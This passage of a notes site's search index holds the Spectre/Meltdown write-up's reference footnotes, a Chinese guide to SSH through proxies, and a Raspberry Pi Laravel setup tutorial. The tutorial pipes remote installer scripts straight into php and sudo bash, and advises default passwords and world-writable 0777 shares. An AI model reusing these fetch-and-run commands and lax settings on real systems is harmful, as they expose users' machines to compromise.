http://blog.stuffedcow.net/2013/01/ivb-cache-replacement/ : This blogpost by Henry Wong investigates the L3 cache replacement policy used by Intel's Ivy Bridge architecture.","title":"Literature"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/#references","text":"[1] This initial report did not contain any information about variant 3. We had discussed whether direct reads from kernel memory could work, but thought that it was unlikely. We later tested and reported variant 3 prior to the publication of Anders Fogh's work at https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/ . [2] The precise model names are listed in the section \"Tested Processors\". The code for reproducing this is in the writeup_files.tar archive in our bugtracker, in the folders userland_test_x86 and userland_test_aarch64. [3] The attacker-controlled offset used to perform an out-of-bounds access on an array by this PoC is a 32-bit value, limiting the accessible addresses to a 4GiB window in the kernel heap area. [4] This PoC won't work on CPUs with SMAP support; however, that is not a fundamental limitation. [5] linux-image-4.9.0-3-amd64 at version 4.9.30-2+deb9u2 (available at http://snapshot.debian.org/archive/debian/20170701T224614Z/pool/main/l/linux/linux-image-4.9.0-3-amd64_4.9.30-2%2Bdeb9u2_amd64.deb , sha256 5f950b26aa7746d75ecb8508cc7dab19b3381c9451ee044cd2edfd6f5efff1f8, signed via Release.gpg , Release , Packages.xz ); that was the current distro kernel version when I set up the machine. It is very unlikely that the PoC works with other kernel versions without changes; it contains a number of hardcoded addresses/offsets. [6] The phone was running an Android build from May 2017. [7] https://software.intel.com/en-us/articles/intel-sdm [8] https://software.intel.com/en-us/articles/avoiding-and-identifying-false-sharing-among-threads , section \"background\" [9] More than 215 mappings would be more efficient, but the kernel places a hard cap of 216 on the number of VMAs that a process can have. [10] Intel's optimization manual states that \"In the first implementation of HT Technology, the physical execution resources are shared and the architecture state is duplicated for each logical processor\", so it would be plausible for predictor state to be shared. While predictor state could be tagged by logical core, that would likely reduce performance for multithreaded processes, so it doesn't seem likely. [11] In case the history buffer was a bit bigger than we had measured, we added some margin - in particular because we had seen slightly different history buffer lengths in different experiments, and because 26 isn't a very round number. [12] The basic idea comes from http://palms.ee.princeton.edu/system/files/SP_vfinal.pdf , section IV, although the authors of that paper still used hugepages. \u539f\u6587\u94fe\u63a5\uff1a https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html","title":"References"},{"location":"RPI/SSH%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5/","text":"SSH\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5 \u4ece\u76ee\u524d\u7f51\u4e0a\u7684\u8d44\u6599\u6765\u770b\uff0c\u901a\u8fc7\u4ee3\u7406\u6765\u8fde\u63a5 ssh \u67092\u79cd\u65b9\u5f0f\uff1a \u4e00\u79cd\u662f\u7528Corkscrew\u5b9e\u73b0http\u4ee3\u7406\u96a7\u9053\u8fde\u63a5\uff0c corkscrew\u5b98\u65b9\u4e3b\u9875 \uff1b \u53e6\u5916\u4e00\u79cd\u662f\u5229\u7528connect\u80fd\u5b9e\u73b0Sock5\u548chttp\u4ee3\u7406\u96a7\u9053\u8fde\u63a5\uff0c connect\u5b98\u65b9\u4e3b\u9875 \uff08connect\u9879\u76ee\u73b0\u5df2\u64a4\u51fa\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u8bf7\u770b\uff1a \u70b9\u8fd9\u91cc \uff09\u3002 \u5148\u6765\u4ecb\u7ecd\u4e00\u4e0bCorkscrew\uff0c\u9996\u5148\u5f3a\u8c03\u7684\u662f\u5b83\u53ea\u80fd\u4f7f\u7528http\u4ee3\u7406\uff0c\u6211\u8bd5\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u53d1\u73b0\u4e0d\u6210\u529f\uff0c\u5176\u539f\u56e0\u5c31\u662f\u6a21\u62df\u7684\u4ee3\u7406\u4e0d\u662fhttp\u4ee3\u7406\uff0c\u81f3\u4e8ehttp\u4ee3\u7406\u7f51\u4e0a\u6709\u5f88\u591a\uff0c\u5927\u5bb6\u53ef\u4ee5\u76f4\u63a5\u641c\u7d22\u540e\u62ff\u6765\u4f7f\u7528\u3002 \u90a3\u4e48\u5982\u4f55\u6765\u4f7f\u7528\u5b83\uff1a 1.\u89e3\u538b\u5e76\u7f16\u8bd1\u5b89\u88c5\uff1a wget http://www.agroman.net/corkscrew/corkscrew-2.0.tar.gztar -xzvf corkscrew-2.0.tar.gz # [..] cd corkscrew ./configure make install 2.\u6dfb\u52a0\u914d\u7f6e\u5230ssh\u7528\u6237\u76ee\u5f55\uff0c$HOME/.ssh/config (\u7f16\u8f91\u8be5\u914d\u7f6e\u6587\u4ef6)\u5199\u5165\uff1a Host * ProxyCommand corkscrew http-proxy.example.com 8080 %h %p \u6ce8\u610fhttp-proxy.example.com\u4e3ahttp\u4ee3\u7406\u5730\u5740\u6839\u636e\u5b9e\u9645\u66f4\u6539\uff0c\u540e\u9762\u76848080\u4e3ahttp \u4ee3\u7406 \u7aef\u53e3\u3002\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fde\u63a5\u4e86\uff1a ssh root@ssh.malu.me -p 22 \u6bd4\u5982\u4ee5\u4e0a\u662f\u964b\u5ba4\u535a\u5ba2\u6f14\u793a\u7684\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5728\u7b2c\u4e8c\u6b21\u767b\u5f55\u65f6\u5c31\u53ef\u770b\u5230\u4e0a\u6b21\u767b\u5f55ip\uff0c\u4ece\u800c\u5224\u65ad\u662f\u5426\u662f\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5\u4e86\u3002 \u63a5\u4e0b\u6765\u4ecb\u7ecdconnect\uff0c\u8be5\u7a0b\u5e8f\u5b98\u65b9\u63d0\u4f9b\u7684\u662fc\u6e90\u6587\u4ef6\uff0c\u4e0b\u8f7d\u4e0b\u6765\u540e\u9700\u8981\u7f16\u8bd1\uff1a 1.\u4e0b\u8f7d\u5e76gcc\u7f16\u8bd1\uff1a wget http://www.meadowy.org/~gotoh/ssh/connect.c gcc connect.c -o connect cp connect /usr/local/bin 2.\u6dfb\u52a0\u914d\u7f6e\u5230ssh\u7528\u6237\u76ee\u5f55\uff0c$HOME/.ssh/config (\u7f16\u8f91\u8be5\u914d\u7f6e\u6587\u4ef6)\u5199\u5165\uff1a ## Outside of the firewall, with HTTP proxy Host * ProxyCommand connect -H proxy.local.net:8080 %h %p \u4ee5\u4e0a\u662f\u900f\u8fc7http\u4ee3\u7406\uff0c\u5982\u679c\u662fsocks\u4ee3\u7406\u5219\u628a-H\u6539\u4e3a-S\uff1a ## Outside of the firewall, use connect command with SOCKS conenction. Host * ProxyCommand connect -S socks.local.net %h %p \u4ee5\u4e0a\u914d\u7f6e\u5c31\u5b8c\u6210\u4e86\uff0c\u6ce8\u610fsocks.local.net\u540c\u6837\u662f\u9700\u8981\u7528\u81ea\u5df1\u7684socks\u4ee3\u7406\u670d\u52a1\u5668\u66ff\u6362\u7684\uff0c\u5728\u7aef\u53e3\u914d\u7f6e\u4e0a\u662f\u52a0\u201c\uff1a\u7aef\u53e3\u53f7\u201d\u6765\u89e3\u51b3\u4e0eCorkscrew\u7684\u914d\u7f6e\u4e0d\u540c\u3002 \u5982\u679c\u662fWindows\u4e0b\u4f7f\u7528 cygwin \u7684\u7528\u6237\uff0c\u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d connect.exe \uff0c\u653e\u5728c:\\window\\\u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u540c\u6837\u7684\u5728$HOME/.ssh/config\u5199\u5165\u76f8\u5e94\u914d\u7f6e\u3002 \u4ee5\u4e0a\u9700\u8981\u7528\u5230\u7684\u6587\u4ef6\u5907\u4efd\u5728\u964b\u5ba4\u535a\u5ba2-\u4e0b\u8f7d-\u6e90\u4ee3\u7801\u91cc\uff1a http://bolg.malu.me/down \u539f\u6587\u94fe\u63a5\uff1a http://bolg.malu.me/html/2011/1809.html","title":"SSH\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5"},{"location":"RPI/SSH%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5/#ssh","text":"\u4ece\u76ee\u524d\u7f51\u4e0a\u7684\u8d44\u6599\u6765\u770b\uff0c\u901a\u8fc7\u4ee3\u7406\u6765\u8fde\u63a5 ssh \u67092\u79cd\u65b9\u5f0f\uff1a \u4e00\u79cd\u662f\u7528Corkscrew\u5b9e\u73b0http\u4ee3\u7406\u96a7\u9053\u8fde\u63a5\uff0c corkscrew\u5b98\u65b9\u4e3b\u9875 \uff1b \u53e6\u5916\u4e00\u79cd\u662f\u5229\u7528connect\u80fd\u5b9e\u73b0Sock5\u548chttp\u4ee3\u7406\u96a7\u9053\u8fde\u63a5\uff0c connect\u5b98\u65b9\u4e3b\u9875 \uff08connect\u9879\u76ee\u73b0\u5df2\u64a4\u51fa\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u8bf7\u770b\uff1a \u70b9\u8fd9\u91cc \uff09\u3002 \u5148\u6765\u4ecb\u7ecd\u4e00\u4e0bCorkscrew\uff0c\u9996\u5148\u5f3a\u8c03\u7684\u662f\u5b83\u53ea\u80fd\u4f7f\u7528http\u4ee3\u7406\uff0c\u6211\u8bd5\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u53d1\u73b0\u4e0d\u6210\u529f\uff0c\u5176\u539f\u56e0\u5c31\u662f\u6a21\u62df\u7684\u4ee3\u7406\u4e0d\u662fhttp\u4ee3\u7406\uff0c\u81f3\u4e8ehttp\u4ee3\u7406\u7f51\u4e0a\u6709\u5f88\u591a\uff0c\u5927\u5bb6\u53ef\u4ee5\u76f4\u63a5\u641c\u7d22\u540e\u62ff\u6765\u4f7f\u7528\u3002 \u90a3\u4e48\u5982\u4f55\u6765\u4f7f\u7528\u5b83\uff1a 1.\u89e3\u538b\u5e76\u7f16\u8bd1\u5b89\u88c5\uff1a wget http://www.agroman.net/corkscrew/corkscrew-2.0.tar.gztar -xzvf corkscrew-2.0.tar.gz # [..] cd corkscrew ./configure make install 2.\u6dfb\u52a0\u914d\u7f6e\u5230ssh\u7528\u6237\u76ee\u5f55\uff0c$HOME/.ssh/config (\u7f16\u8f91\u8be5\u914d\u7f6e\u6587\u4ef6)\u5199\u5165\uff1a Host * ProxyCommand corkscrew http-proxy.example.com 8080 %h %p \u6ce8\u610fhttp-proxy.example.com\u4e3ahttp\u4ee3\u7406\u5730\u5740\u6839\u636e\u5b9e\u9645\u66f4\u6539\uff0c\u540e\u9762\u76848080\u4e3ahttp \u4ee3\u7406 \u7aef\u53e3\u3002\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fde\u63a5\u4e86\uff1a ssh root@ssh.malu.me -p 22 \u6bd4\u5982\u4ee5\u4e0a\u662f\u964b\u5ba4\u535a\u5ba2\u6f14\u793a\u7684\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5728\u7b2c\u4e8c\u6b21\u767b\u5f55\u65f6\u5c31\u53ef\u770b\u5230\u4e0a\u6b21\u767b\u5f55ip\uff0c\u4ece\u800c\u5224\u65ad\u662f\u5426\u662f\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5\u4e86\u3002 \u63a5\u4e0b\u6765\u4ecb\u7ecdconnect\uff0c\u8be5\u7a0b\u5e8f\u5b98\u65b9\u63d0\u4f9b\u7684\u662fc\u6e90\u6587\u4ef6\uff0c\u4e0b\u8f7d\u4e0b\u6765\u540e\u9700\u8981\u7f16\u8bd1\uff1a 1.\u4e0b\u8f7d\u5e76gcc\u7f16\u8bd1\uff1a wget http://www.meadowy.org/~gotoh/ssh/connect.c gcc connect.c -o connect cp connect /usr/local/bin 2.\u6dfb\u52a0\u914d\u7f6e\u5230ssh\u7528\u6237\u76ee\u5f55\uff0c$HOME/.ssh/config (\u7f16\u8f91\u8be5\u914d\u7f6e\u6587\u4ef6)\u5199\u5165\uff1a ## Outside of the firewall, with HTTP proxy Host * ProxyCommand connect -H proxy.local.net:8080 %h %p \u4ee5\u4e0a\u662f\u900f\u8fc7http\u4ee3\u7406\uff0c\u5982\u679c\u662fsocks\u4ee3\u7406\u5219\u628a-H\u6539\u4e3a-S\uff1a ## Outside of the firewall, use connect command with SOCKS conenction. Host * ProxyCommand connect -S socks.local.net %h %p \u4ee5\u4e0a\u914d\u7f6e\u5c31\u5b8c\u6210\u4e86\uff0c\u6ce8\u610fsocks.local.net\u540c\u6837\u662f\u9700\u8981\u7528\u81ea\u5df1\u7684socks\u4ee3\u7406\u670d\u52a1\u5668\u66ff\u6362\u7684\uff0c\u5728\u7aef\u53e3\u914d\u7f6e\u4e0a\u662f\u52a0\u201c\uff1a\u7aef\u53e3\u53f7\u201d\u6765\u89e3\u51b3\u4e0eCorkscrew\u7684\u914d\u7f6e\u4e0d\u540c\u3002 \u5982\u679c\u662fWindows\u4e0b\u4f7f\u7528 cygwin \u7684\u7528\u6237\uff0c\u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d connect.exe \uff0c\u653e\u5728c:\\window\\\u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u540c\u6837\u7684\u5728$HOME/.ssh/config\u5199\u5165\u76f8\u5e94\u914d\u7f6e\u3002 \u4ee5\u4e0a\u9700\u8981\u7528\u5230\u7684\u6587\u4ef6\u5907\u4efd\u5728\u964b\u5ba4\u535a\u5ba2-\u4e0b\u8f7d-\u6e90\u4ee3\u7801\u91cc\uff1a http://bolg.malu.me/down \u539f\u6587\u94fe\u63a5\uff1a http://bolg.malu.me/html/2011/1809.html","title":"SSH\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/","text":"Using Raspberry Pi for Laravel developing | by Ronie Meque | Medium Using Raspberry Pi for Laravel developing This article can be viewed in portuguese here . If you are a Laravel developer and can\u2019t afford a Mac or can\u2019t migrate definitely for Linux distro because it lacks an app (Photoshop in my case), chances are high that you already got a bit frustatred in doing so in a Windows. If you also use Laravel Mix for some assets managing, like babel and sass , you have probabably got really frustrated at a point. It doesn\u2019t matter how powerfull your Windows rig is, it\u2019s going to be slow \u2014 mainly doing Composer install or handling Node.js. There are a few options out there though: Git Bash. It is possible to run everything you would do in a Linux distro inside the Git Bash shell that comes with Git for Windows, and it works really nice! Until then, this was my favorite method. Homestead. Homestead is a nice little Ubuntu Vagrant box packed with everything you might need to do some Laravel developing, but according to personal experience and community feedback, it kinda sucks in Windows, in matters of speed mainly. A dedicated Linux for the job. This is the case we will cover here, more specifically using a Raspberry Pi (It\u2019s very cheap). If you have an old computer lying around it is probably worth a try either! Anyway, what we want: A Raspberry Pi device running a Laravel 5.5 application with PHP\u2019s built-in server, automatically compiling frontend assets with Laravel Mix and serving all through the local network. We also want the project\u2019s folder to be easily accessible through our local network, making it feel like we are editing the files from Windows inside our Raspberry Pi. Requirements: Raspberry Pi 3 (it will probably work on older models too though) Local network Lastest Raspbian (currently Stretch) A decent command line in Windows. What I recommend: Git Bash alongside the Cmder or Hyper emulators. If you can\u2019t or don\u2019t want to use Git Bash, Cmder includes Clink which provides a few usefull Unix commands in Window\u2019s command line. Basic Raspberry Pi setup (OPTIONAL) Let\u2019s configure remote access to the Pi, expand the filesystem and disable the GUI. Remote access With a keyboard and screen conected to your Pi (soon you won\u2019t need them anymore) Enter sudo raspi-config in the CLI. Choose Interfacing Options and after SSH Pick yes and close the menu Now execute hostname -I to find out what is your Pi\u2019s local IP. Back to the computer, we can now access the Pi with ssh pi@YOUR-PI-IP Example: ssh pi@192.168.1.38 The default password is \u201craspberry\u201d. It\u2019s likelly that in the first connection you will have to type yes to confirm you trust the host. Let\u2019s configure a key so we won\u2019t need to type the password again. If you don\u2019t have a key on your PC, generate one using ssh-keygen -t rsa and confirm all the questions with an enter. The key will be stored in a .ssh folder in your home folder inside two files: id_rsa and id_rsa.pub . Back to your PC now execute ssh-copy-id -i path/to/id_rsa.pub pi@YOUR-PI-IP Example: ssh-copy-id -i ~/.ssh/id_rsa.pub pi@192.168.1.38 Type the password for the last time and it\u2019s done! \ud83d\ude2e Disabling the GUI and expanding the filesystem Since we will do all the work in the remote CLI, the GUI and keyboard are no longer needed. We will also expand the filesystem to use the whole SD Card (Raspbian doesn\u2019t do that by default). In your remote CLI type sudo raspi-config Navigate to Boot options , then Desktop / CLI and select Console Back to the main menu, go to Advanced Options and then Expand Filesystem. When requested, reboot your Pi. Sharing the Raspberry files across your local network Depending on a FTP, SFTP and such here would just blow away all the fun, so let\u2019s setup a folder sharing from your Pi to your Windows. After this, you will be able to open your project\u2019s folder in your editor or IDE naturally like it was inside Windows. In your Pi, do the following: sudo apt install samba samba-common-bin -y sudo vim /etc/samba/smb.conf (Replace vim with any CLI editor you like or simply install vim with sudo apt install vim -y ) Find the following lines and edit them like follows: (The workgroup name can be anything alphanumeric) workgroup = nicetidygroupy wins support = yes Add this at the end of the file (In this case we are sharing the whole home folder from the Pi user): [pihome] comment= Pi Home path=/home/pi browseable=Yes writeable=Yes only guest=no create mask=0777 directory mask=0777 public=no Save smb.conf file and do configure the sharing login with smbpasswd -a pi (Since this a local development server, I recommend using the same password from the Pi user \u2014 by default \u201craspberry\u201d) Restart samba so we can be sure everything will be ok: sudo /etc/init.d/samba restart If everything went well, it\u2019s likelly your Pi will now appear in your Windows network tab. When asked for a password, use the login \u201cpi\u201d alongside the password you defined in the last step. Sharing Pi\u2019s home to WindowsIf your devices are connected through cable, the experience here will be just perfect, but it works really well in Wi-Fi too. Installing PHP 7.0 and Composer on Raspberry Pi In order to install PHP 7.0 and some of Laravel\u2019s mandatory and opcional dependencies, execute the following: sudo apt install php7.0 php7.0-curl php7.0-gd php7.0-imap php7.0-json php7.0-mcrypt php7.0-mysql php7.0-opcache php7.0-xmlrpc php7.0-xml php7.0-fpm php7.0-zip -y Check if everything is ok by doing php -v . The output should be something like: It works! Installing Composer Now that we have PHP, do the following to install Composer: $ curl -sS https://getcomposer.org/installer | php$ sudo mv composer.phar /usr/local/bin/composer Check if went well with composer --version \ud83c\udd92 Installing MariaDB (mysql) on Raspberry Pi MariaDB is and open source alternative to Oracle\u2019s MySQL. In order to install it, execute: sudo apt install mariadb-server mariadb-client -y Once again check if everything worked with mysql --version : \ud83c\udf7b After installed you can access it with sudo mysql -u root -p . Considering we are setting up a development only environment here, let\u2019s make things easier by creating a new user and giving it full access to MariaDB. This will discard the need to sudo in MariaDB. Execute sudo mysql -u root -p to access MariaDB and then do the following queries, replacing what is in bold with what you prefer. CREATE USER '**user**'@'localhost' IDENTIFIED BY '**pass**';GRANT ALL PRIVILEGES ON * . * TO '**user**'@'localhost';FLUSH PRIVILEGES; After that you can access MariaDB by simply doing mysql -u **usuario** -p . You can also use these credentials in your application. Installing Node.js on Raspberry Pi (OPTIONAL) If you do assets compiling in your project, you will likely need to configure Node.js. Raspbian\u2019s current version comes with Node.js 4. by default, which doesn\u2019t work nice with most of Laravel Mix dependencies, for example. Instead, let\u2019s configure the 8. version. Execute the following: $ curl -sL <https://deb.nodesource.com/setup_8.x> | sudo -E bash -$ sudo apt install nodejs Check if everything is ok with node -v Creating a new Laravel app on Raspberry Pi With all the system dependecies set, let\u2019s create a new project. In case you are cloning an existing one, head down to the bottom of this section. Create a new folder to hold our projects with mkdir ~/projects and access it with cd ~/projects Execute the following to create a new project based on Laravel\u2019s default skeleton: composer create-project --prefer-dist laravel/laravel the-coolest-project-name Everything should run fine and the project will be created! If composer complains that something is missing, try searching the package\u2019s name and installing it with sudo apt install . In this step Composer already installed all of Laravel\u2019s backend dependencies. Cloning an existing project In case the project already exists, acess the projects folder created in the last step and do the following: Clone your project using git. Example: git clone git@github.com:roniemeque/nice-little-app.git acess the created folder with cd nice-little-app and install all of Laravel\u2019s backend dependencies with composer install configure your .env file, generate the app\u2019s key, run your migrations and the usual Laravel setup. Installing the dependencies for assets manipulation with NPM If you use some kind of compilling, polifylling, minification and such and you have installed Node.js in your Pi, now it\u2019s time to install the project\u2019s dependencies. Whether it\u2019s a new or existing app, execute npm install in its folder. Important detail: the output of npm\u2019s installs in Raspbian is a lot more verbose and slower than the usual, but don\u2019t worry because after everything is installed it will work like it should, depending on your project depencies, of course. Laravel Mix\u2019s dependencies run perfectly in here so far! Now that everything is working, let\u2019s head to the final steps: Running Laravel on Raspberry Pi with PHP\u2019s built-in server Let\u2019s use artisan to manage the server. Execute the following: php artisan serve --host=YOUR-PI-IP (If you can\u2019t remember the IP of your Pi, use hostname -I to see it). Get ready now, it\u2019s coming! In your PC, browse to http://YOUR-PI-IP:8000 and see the result. Example: http://192.168.1.38:8000 Automatically manipulating frontend assets with Laravel Mix on Raspberry Pi If you don\u2019t use Laravel Mix , oh boy you should. It\u2019s an excellent wrapper around Webpack that makes working with Webpack seems like a breeze. You can even use it in non-laravel projects! Access your Pi in a new console tab without closing the one running the server and execute npm run dev inside your project\u2019s folder. If all of your Sass, Less, Coffe, Typescript and etcetera compiled correctly, let\u2019s set the compiling to happen automatically everytime a file is saved with npm run watch . Note on Browsersync If you use Browsersync alongside your Laravel Mix, you can still use it here, but not directly, of course. Configure your Browsersync so it won\u2019t open any browser by default and you will be able to use it by browsing to the remote host Browsersync provides. (It will pop-up in the first output from npm run watch ) \u2014 your online option must be set to true also, but in Laravel Mix it is set by default. If you would like to disable Browsersync at all everytime you use your Pi for developing but you don\u2019t want to keep changing the webpack.mix.js settings and discarding it everytime, Laravel provides a nice way to solve this: In your .env file, add something like this: MIX_BROWSERSYNC=false Now change your Browsersync call inside you webpack.mix.js file so it is surrounded by the following condition: if(process.env.MIX_BROWSERSYNC){ mix.browserSync({your options go here}); } With that you can tell Laravel Mix that you don\u2019t want Browsersync in this environment. Don\u2019t forget to set it to true in the environments you want it enabled. And that\u2019s it At this point you probably have a very decent and fine development environment on your Pi. It is also portable! Don\u2019t forget to always check your IP and network settings in case you plan on carrying it around though. It\u2019s likelly there are tons of ways to accomplish this procedure and it\u2019s possible by the time you read this some things will be outdated. It\u2019s very important to always pay attention to the names of the packages you are installing and the output of the commands you run. If you are doing this it\u2019s quite probable you are used to being frustrated with broken packages or doing a lot of Google to fix tiny hidden errors that will only happen in your system. I really hope this post will help anyone that tries to accomplish a similar result in using the Raspberry Pi as a development server, regardless of your PHP framework, versions and project requirements. \u539f\u6587\u94fe\u63a5\uff1a https://medium.com/@roniemeque/using-raspberry-pi-for-laravel-developing-30dabcdeba43","title":"Using Raspberry Pi for Laravel developing"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#using-raspberry-pi-for-laravel-developing-by-ronie-meque-medium","text":"","title":"Using Raspberry Pi for Laravel developing | by Ronie Meque | Medium"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#using-raspberry-pi-for-laravel-developing","text":"This article can be viewed in portuguese here . If you are a Laravel developer and can\u2019t afford a Mac or can\u2019t migrate definitely for Linux distro because it lacks an app (Photoshop in my case), chances are high that you already got a bit frustatred in doing so in a Windows. If you also use Laravel Mix for some assets managing, like babel and sass , you have probabably got really frustrated at a point. It doesn\u2019t matter how powerfull your Windows rig is, it\u2019s going to be slow \u2014 mainly doing Composer install or handling Node.js. There are a few options out there though: Git Bash. It is possible to run everything you would do in a Linux distro inside the Git Bash shell that comes with Git for Windows, and it works really nice! Until then, this was my favorite method. Homestead. Homestead is a nice little Ubuntu Vagrant box packed with everything you might need to do some Laravel developing, but according to personal experience and community feedback, it kinda sucks in Windows, in matters of speed mainly. A dedicated Linux for the job. This is the case we will cover here, more specifically using a Raspberry Pi (It\u2019s very cheap). If you have an old computer lying around it is probably worth a try either! Anyway, what we want: A Raspberry Pi device running a Laravel 5.5 application with PHP\u2019s built-in server, automatically compiling frontend assets with Laravel Mix and serving all through the local network. We also want the project\u2019s folder to be easily accessible through our local network, making it feel like we are editing the files from Windows inside our Raspberry Pi.","title":"Using Raspberry Pi for Laravel developing"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#requirements","text":"Raspberry Pi 3 (it will probably work on older models too though) Local network Lastest Raspbian (currently Stretch) A decent command line in Windows. What I recommend: Git Bash alongside the Cmder or Hyper emulators. If you can\u2019t or don\u2019t want to use Git Bash, Cmder includes Clink which provides a few usefull Unix commands in Window\u2019s command line.","title":"Requirements:"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#basic-raspberry-pi-setup-optional","text":"Let\u2019s configure remote access to the Pi, expand the filesystem and disable the GUI.","title":"Basic Raspberry Pi setup (OPTIONAL)"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#remote-access","text":"With a keyboard and screen conected to your Pi (soon you won\u2019t need them anymore) Enter sudo raspi-config in the CLI. Choose Interfacing Options and after SSH Pick yes and close the menu Now execute hostname -I to find out what is your Pi\u2019s local IP. Back to the computer, we can now access the Pi with ssh pi@YOUR-PI-IP Example: ssh pi@192.168.1.38 The default password is \u201craspberry\u201d. It\u2019s likelly that in the first connection you will have to type yes to confirm you trust the host. Let\u2019s configure a key so we won\u2019t need to type the password again. If you don\u2019t have a key on your PC, generate one using ssh-keygen -t rsa and confirm all the questions with an enter. The key will be stored in a .ssh folder in your home folder inside two files: id_rsa and id_rsa.pub . Back to your PC now execute ssh-copy-id -i path/to/id_rsa.pub pi@YOUR-PI-IP Example: ssh-copy-id -i ~/.ssh/id_rsa.pub pi@192.168.1.38 Type the password for the last time and it\u2019s done! \ud83d\ude2e","title":"Remote access"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#disabling-the-gui-and-expanding-the-filesystem","text":"Since we will do all the work in the remote CLI, the GUI and keyboard are no longer needed. We will also expand the filesystem to use the whole SD Card (Raspbian doesn\u2019t do that by default). In your remote CLI type sudo raspi-config Navigate to Boot options , then Desktop / CLI and select Console Back to the main menu, go to Advanced Options and then Expand Filesystem. When requested, reboot your Pi.","title":"Disabling the GUI and expanding the filesystem"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#sharing-the-raspberry-files-across-your-local-network","text":"Depending on a FTP, SFTP and such here would just blow away all the fun, so let\u2019s setup a folder sharing from your Pi to your Windows. After this, you will be able to open your project\u2019s folder in your editor or IDE naturally like it was inside Windows. In your Pi, do the following: sudo apt install samba samba-common-bin -y sudo vim /etc/samba/smb.conf (Replace vim with any CLI editor you like or simply install vim with sudo apt install vim -y ) Find the following lines and edit them like follows: (The workgroup name can be anything alphanumeric) workgroup = nicetidygroupy wins support = yes Add this at the end of the file (In this case we are sharing the whole home folder from the Pi user): [pihome] comment= Pi Home path=/home/pi browseable=Yes writeable=Yes only guest=no create mask=0777 directory mask=0777 public=no Save smb.conf file and do configure the sharing login with smbpasswd -a pi (Since this a local development server, I recommend using the same password from the Pi user \u2014 by default \u201craspberry\u201d) Restart samba so we can be sure everything will be ok: sudo /etc/init.d/samba restart If everything went well, it\u2019s likelly your Pi will now appear in your Windows network tab. When asked for a password, use the login \u201cpi\u201d alongside the password you defined in the last step. Sharing Pi\u2019s home to WindowsIf your devices are connected through cable, the experience here will be just perfect, but it works really well in Wi-Fi too.","title":"Sharing the Raspberry files across your local network"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-php-70-and-composer-on-raspberry-pi","text":"In order to install PHP 7.0 and some of Laravel\u2019s mandatory and opcional dependencies, execute the following: sudo apt install php7.0 php7.0-curl php7.0-gd php7.0-imap php7.0-json php7.0-mcrypt php7.0-mysql php7.0-opcache php7.0-xmlrpc php7.0-xml php7.0-fpm php7.0-zip -y Check if everything is ok by doing php -v . The output should be something like: It works!","title":"Installing PHP 7.0 and Composer on Raspberry Pi"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-composer","text":"Now that we have PHP, do the following to install Composer: $ curl -sS https://getcomposer.org/installer | php$ sudo mv composer.phar /usr/local/bin/composer Check if went well with composer --version \ud83c\udd92","title":"Installing Composer"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-mariadb-mysql-on-raspberry-pi","text":"MariaDB is and open source alternative to Oracle\u2019s MySQL. In order to install it, execute: sudo apt install mariadb-server mariadb-client -y Once again check if everything worked with mysql --version : \ud83c\udf7b After installed you can access it with sudo mysql -u root -p . Considering we are setting up a development only environment here, let\u2019s make things easier by creating a new user and giving it full access to MariaDB. This will discard the need to sudo in MariaDB. Execute sudo mysql -u root -p to access MariaDB and then do the following queries, replacing what is in bold with what you prefer. CREATE USER '**user**'@'localhost' IDENTIFIED BY '**pass**';GRANT ALL PRIVILEGES ON * . * TO '**user**'@'localhost';FLUSH PRIVILEGES; After that you can access MariaDB by simply doing mysql -u **usuario** -p . You can also use these credentials in your application.","title":"Installing MariaDB (mysql) on Raspberry Pi"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#installing-nodejs-on-raspberry-pi-optional","text":"If you do assets compiling in your project, you will likely need to configure Node.js. Raspbian\u2019s current version comes with Node.js 4. by default, which doesn\u2019t work nice with most of Laravel Mix dependencies, for example. Instead, let\u2019s configure the 8. version. Execute the following: $ curl -sL <https://deb.nodesource.com/setup_8.x> | sudo -E bash -$ sudo apt install nodejs Check if everything is ok with node -v","title":"Installing Node.js on Raspberry Pi (OPTIONAL)"},{"location":"RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/#creating-a-new-laravel-app-on-raspberry-pi","text":"With all the system dependecies set, let\u2019s create a new project. In case you are cloning an existing one, head down to the bottom of this section. Create a new folder to hold our projects with mkdir ~/projects and access it with cd ~/projects Execute the following to create a new project based on Laravel\u2019s default skeleton: composer create-project --prefer-dist laravel/laravel the-coolest-project-name Everything should run fine and the project will be created! If composer complains that something is missing, try searching the package\u2019s name and installing it with sudo apt install . In this step Composer already installed all 